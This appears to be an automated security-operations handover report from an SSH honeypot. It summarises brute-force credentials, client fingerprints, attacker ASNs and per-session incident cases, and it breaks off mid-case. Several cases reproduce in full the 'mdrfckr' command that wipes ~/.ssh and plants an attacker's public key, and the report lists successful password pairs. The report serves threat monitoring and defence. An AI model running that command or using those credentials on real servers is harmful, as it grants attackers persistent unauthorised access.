# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-25 |
| **Generated At** | 2026-05-25T21:13:34Z |
| **Shift Time** | 21:13 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **116** |
| Confirmed Threats | **105** |
| False Positives Filtered | **11** (9.5%) |
| Unique Attacker IPs | **17** |
| Countries of Origin | **8** |
| High Severity Cases | **46** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **70** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **97** |
| Unique Credential Pairs | **44** |
| Unique Usernames | **25** |
| Unique Passwords | **42** |
| Successful Auth Pairs | **28** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 46 |
| `345gs5662d34` | 23 |
| `ubuntu` | 3 |
| `cloud` | 3 |
| `curl` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 23 |
| `3245gs5662d34` | 23 |
| `fjbdfdjkdsfs541544AA@@` | 5 |
| `fjbdfdjkdsfs541544@@` | 4 |
| `Wangsu@2017` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 23 |
| `root` | `3245gs5662d34` | 23 |
| `root` | `fjbdfdjkdsfs541544@@` | 4 |
| `root` | `fjbdfdjkdsfs541544AA@@` | 3 |
| `cloud` | `Wangsu@2017` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `fjbdfdjkdsfs541544@@` | `120.48.44.93` | 2026-05-25T19:50:57 |
| `root` | `3245gs5662d34` | `120.48.44.93` | 2026-05-25T19:51:05 |
| `root` | `fjbdfdjkdsfs541544@@` | `191.6.25.239` | 2026-05-25T19:52:48 |
| `root` | `3245gs5662d34` | `191.6.25.239` | 2026-05-25T19:52:55 |
| `root` | `P@55w0rd!` | `186.38.26.5` | 2026-05-25T19:59:27 |
| `root` | `3245gs5662d34` | `186.38.26.5` | 2026-05-25T19:59:36 |
| `root` | `225588` | `183.36.126.68` | 2026-05-25T20:04:27 |
| `root` | `3245gs5662d34` | `183.36.126.68` | 2026-05-25T20:04:33 |
| `root` | `Admin123!` | `183.36.126.68` | 2026-05-25T20:05:13 |
| `root` | `Qwerty2025` | `183.36.126.68` | 2026-05-25T20:05:33 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `183.36.126.68` | 2026-05-25T20:06:20 |
| `root` | `qwerty` | `183.36.126.68` | 2026-05-25T20:07:26 |
| `root` | `A123456..` | `183.36.126.68` | 2026-05-25T20:08:09 |
| `root` | `fjbdfdjkdsfs541544@@` | `183.36.126.68` | 2026-05-25T20:10:43 |
| `root` | `l` | `180.167.207.234` | 2026-05-25T20:15:20 |
| `root` | `3245gs5662d34` | `180.167.207.234` | 2026-05-25T20:15:25 |
| `root` | `Abc1234@` | `180.167.207.234` | 2026-05-25T20:16:55 |
| `root` | `hotmail` | `180.167.207.234` | 2026-05-25T20:17:49 |
| `root` | `P@ssw0rd#2025` | `180.167.207.234` | 2026-05-25T20:18:24 |
| `root` | `fjbdfdjkdsfs541544@@` | `180.167.207.234` | 2026-05-25T20:18:41 |
| `root` | `2wsx#EDC2wsx` | `180.167.207.234` | 2026-05-25T20:19:16 |
| `root` | `P@ssword12345@` | `180.167.207.234` | 2026-05-25T20:19:34 |
| `root` | `Welcome2025@` | `180.167.207.234` | 2026-05-25T20:19:54 |
| `root` | `Ks123456` | `180.167.207.234` | 2026-05-25T20:20:11 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `180.167.207.234` | 2026-05-25T20:20:29 |
| `root` | `1234qwer!@#$` | `120.48.44.93` | 2026-05-25T20:46:52 |
| `root` | `Master2026` | `120.48.44.93` | 2026-05-25T20:56:03 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `120.48.44.93` | 2026-05-25T21:05:10 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **116** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 97 |
| OpenSSH | 1 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 74 | 2 |
| `af8223ac9914...` | libssh-based | 17 | 1 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `c118de82e19e...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 74 | 2 | Modern SSH client |
| `af8223ac9914...` | libssh | 17 | 1 | libssh-based |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `c118de82e19e...` | OpenSSH | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 23 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `183.36.126.68`, `180.167.207.234`, `186.38.26.5`, `191.6.25.239`, `120.48.44.93`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **17** |
| Unique ASNs | **14** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS53178` | SCNet Equipamentos de Informática Ltda | 1 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |
| `AS22927` | Telefonica de Argentina | 1 | HIGH |
| `AS136525` | Wancom (Pvt) Ltd. | 1 | LOW |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS263546` | TURBONETT TELECOMUNICACOES LTDA. - ME | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (46)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b07610191f56

| Field | Detail |
|---|---|
| **Source IP** | `120.48.44[.]93` |
| **First Seen** | 2026-05-25 19:50 |
| **Last Seen** | 2026-05-25 19:51 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:50:53` | `cowrie.session.connect` |
| `2026-05-25 19:50:53` | `cowrie.client.version` |
| `2026-05-25 19:50:55` | `cowrie.client.kex` |
| `2026-05-25 19:50:57` | `cowrie.login.success` |
| `2026-05-25 19:50:58` | `cowrie.session.params` |
| `2026-05-25 19:50:58` | `cowrie.command.input` |
| `2026-05-25 19:50:58` | `cowrie.command.failed` |
| `2026-05-25 19:50:58` | `cowrie.log.closed` |
| `2026-05-25 19:50:58` | `cowrie.session.params` |
| `2026-05-25 19:50:58` | `cowrie.command.input` |
| `2026-05-25 19:50:58` | `cowrie.session.file_download` |
| `2026-05-25 19:50:58` | `cowrie.log.closed` |
| `2026-05-25 19:51:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.44[.]93` to AbuseIPDB if not already reported
- [ ] Block `120.48.44[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-710e6bbdbd39

| Field | Detail |
|---|---|
| **Source IP** | `120.48.44[.]93` |
| **First Seen** | 2026-05-25 19:51 |
| **Last Seen** | 2026-05-25 19:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:51:02` | `cowrie.session.connect` |
| `2026-05-25 19:51:02` | `cowrie.client.version` |
| `2026-05-25 19:51:03` | `cowrie.client.kex` |
| `2026-05-25 19:51:05` | `cowrie.login.success` |
| `2026-05-25 19:51:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.44[.]93` to AbuseIPDB if not already reported
- [ ] Block `120.48.44[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ba001258caa

| Field | Detail |
|---|---|
| **Source IP** | `191.6.25[.]239` |
| **First Seen** | 2026-05-25 19:52 |
| **Last Seen** | 2026-05-25 19:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:52:46` | `cowrie.session.connect` |
| `2026-05-25 19:52:46` | `cowrie.client.version` |
| `2026-05-25 19:52:47` | `cowrie.client.kex` |
| `2026-05-25 19:52:48` | `cowrie.login.success` |
| `2026-05-25 19:52:48` | `cowrie.session.params` |
| `2026-05-25 19:52:48` | `cowrie.command.input` |
| `2026-05-25 19:52:48` | `cowrie.command.failed` |
| `2026-05-25 19:52:49` | `cowrie.log.closed` |
| `2026-05-25 19:52:49` | `cowrie.session.params` |
| `2026-05-25 19:52:49` | `cowrie.command.input` |
| `2026-05-25 19:52:50` | `cowrie.session.file_download` |
| `2026-05-25 19:52:50` | `cowrie.log.closed` |
| `2026-05-25 19:52:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.6.25[.]239` to AbuseIPDB if not already reported
- [ ] Block `191.6.25[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1926deb06df6

| Field | Detail |
|---|---|
| **Source IP** | `191.6.25[.]239` |
| **First Seen** | 2026-05-25 19:52 |
| **Last Seen** | 2026-05-25 19:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:52:53` | `cowrie.session.connect` |
| `2026-05-25 19:52:53` | `cowrie.client.version` |
| `2026-05-25 19:52:53` | `cowrie.client.kex` |
| `2026-05-25 19:52:55` | `cowrie.login.success` |
| `2026-05-25 19:52:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.6.25[.]239` to AbuseIPDB if not already reported
- [ ] Block `191.6.25[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fda246c1ffc

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-05-25 19:59 |
| **Last Seen** | 2026-05-25 19:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:59:25` | `cowrie.session.connect` |
| `2026-05-25 19:59:25` | `cowrie.client.version` |
| `2026-05-25 19:59:26` | `cowrie.client.kex` |
| `2026-05-25 19:59:27` | `cowrie.login.success` |
| `2026-05-25 19:59:28` | `cowrie.session.params` |
| `2026-05-25 19:59:28` | `cowrie.command.input` |
| `2026-05-25 19:59:28` | `cowrie.command.failed` |
| `2026-05-25 19:59:29` | `cowrie.log.closed` |
| `2026-05-25 19:59:29` | `cowrie.session.params` |
| `2026-05-25 19:59:29` | `cowrie.command.input` |
| `2026-05-25 19:59:30` | `cowrie.session.file_download` |
| `2026-05-25 19:59:30` | `cowrie.log.closed` |
| `2026-05-25 19:59:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f12f97ca30b9

| Field | Detail |
|---|---|
| **Source IP** | `186.38.26[.]5` |
| **First Seen** | 2026-05-25 19:59 |
| **Last Seen** | 2026-05-25 19:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:59:34` | `cowrie.session.connect` |
| `2026-05-25 19:59:34` | `cowrie.client.version` |
| `2026-05-25 19:59:34` | `cowrie.client.kex` |
| `2026-05-25 19:59:36` | `cowrie.login.success` |
| `2026-05-25 19:59:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.38.26[.]5` to AbuseIPDB if not already reported
- [ ] Block `186.38.26[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c801eaeb90ae

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-05-25 20:04 |
| **Last Seen** | 2026-05-25 20:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:04:25` | `cowrie.session.connect` |
| `2026-05-25 20:04:26` | `cowrie.client.version` |
| `2026-05-25 20:04:26` | `cowrie.client.kex` |
| `2026-05-25 20:04:27` | `cowrie.login.success` |
| `2026-05-25 20:04:28` | `cowrie.session.params` |
| `2026-05-25 20:04:28` | `cowrie.command.input` |
| `2026-05-25 20:04:28` | `cowrie.command.failed` |
| `2026-05-25 20:04:28` | `cowrie.log.closed` |
| `2026-05-25 20:04:29` | `cowrie.session.params` |
| `2026-05-25 20:04:29` | `cowrie.command.input` |
| `2026-05-25 20:04:29` | `cowrie.session.file_download` |
| `2026-05-25 20:04:29` | `cowrie.log.closed` |
| `2026-05-25 20:04:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1e9083309bc

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-05-25 20:04 |
| **Last Seen** | 2026-05-25 20:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:04:32` | `cowrie.session.connect` |
| `2026-05-25 20:04:32` | `cowrie.client.version` |
| `2026-05-25 20:04:32` | `cowrie.client.kex` |
| `2026-05-25 20:04:33` | `cowrie.login.success` |
| `2026-05-25 20:04:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54f245ac3be8

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-05-25 20:05 |
| **Last Seen** | 2026-05-25 20:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:05:11` | `cowrie.session.connect` |
| `2026-05-25 20:05:11` | `cowrie.client.version` |
| `2026-05-25 20:05:12` | `cowrie.client.kex` |
| `2026-05-25 20:05:13` | `cowrie.login.success` |
| `2026-05-25 20:05:14` | `cowrie.session.params` |
| `2026-05-25 20:05:14` | `cowrie.command.input` |
| `2026-05-25 20:05:14` | `cowrie.command.failed` |
| `2026-05-25 20:05:15` | `cowrie.log.closed` |
| `2026-05-25 20:05:16` | `cowrie.session.params` |
| `2026-05-25 20:05:16` | `cowrie.command.input` |
| `2026-05-25 20:05:16` | `cowrie.session.file_download` |
| `2026-05-25 20:05:16` | `cowrie.log.closed` |
| `2026-05-25 20:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d93db4a091fe

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-05-25 20:05 |
| **Last Seen** | 2026-05-25 20:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:05:19` | `cowrie.session.connect` |
| `2026-05-25 20:05:19` | `cowrie.client.version` |
| `2026-05-25 20:05:19` | `cowrie.client.kex` |
| `2026-05-25 20:05:20` | `cowrie.login.success` |
| `2026-05-25 20:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1960086da890

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-05-25 20:05 |
| **Last Seen** | 2026-05-25 20:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:05:32` | `cowrie.session.connect` |
| `2026-05-25 20:05:32` | `cowrie.client.version` |
| `2026-05-25 20:05:32` | `cowrie.client.kex` |
| `2026-05-25 20:05:33` | `cowrie.login.success` |
| `2026-05-25 20:05:34` | `cowrie.session.params` |
| `2026-05-25 20:05:34` | `cowrie.command.input` |
| `2026-05-25 20:05:34` | `cowrie.command.failed` |
| `2026-05-25 20:05:34` | `cowrie.log.closed` |
| `2026-05-25 20:05:35` | `cowrie.session.params` |
| `2026-05-25 20:05:35` | `cowrie.command.input` |
| `2026-05-25 20:05:35` | `cowrie.session.file_download` |
| `2026-05-25 20:05:35` | `cowrie.log.closed` |
| `2026-05-25 20:05:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da5bb516cbc1

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-05-25 20:05 |
| **Last Seen** | 2026-05-25 20:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 20:05:38` | `cowrie.session.connect` |
| `2026-05-25 20:05:38` | `cowrie.client.version` |
| `2026-05-25 20:05:38` | `cowrie.client.kex` |
| `2026-05-25 20:05:39` | `cowrie.login.success` |
| `2026-05-25 20:05:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-507b4322583e

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-05-25 20:06 |
| **Last Seen** | 2026-05-25 20:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
